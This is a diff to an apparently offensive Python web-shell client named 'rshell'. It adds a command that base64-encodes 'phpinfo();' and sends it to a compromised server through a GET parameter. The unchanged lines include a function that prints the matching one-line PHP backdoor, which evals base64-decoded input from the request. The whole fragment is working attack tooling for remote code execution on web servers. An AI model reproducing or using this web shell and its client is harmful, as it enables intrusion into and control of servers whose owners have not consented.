@@ -69,5 +69,17 @@ class rshell(Cmd):
     def do_payload(self, line):
         self.print_payload()
 
+    def do_phpinfo(self, line):
+        #This is the default command method
+        #system function is called with the command to execute
+        s = "phpinfo();"
+        #building url
+        url = self.shell_url + '?param='
+        #adding base64 encoded parameter
+        #the [:-1] is because encodestring add a \n at the end
+        url += quote_plus(base64.encodestring(s)[:-1])
+        #doing the request to the server
+        self.dorequest(url)
+
     def print_payload(self):
         print "<?php eval(base64_decode($_GET['param'])); ?>"
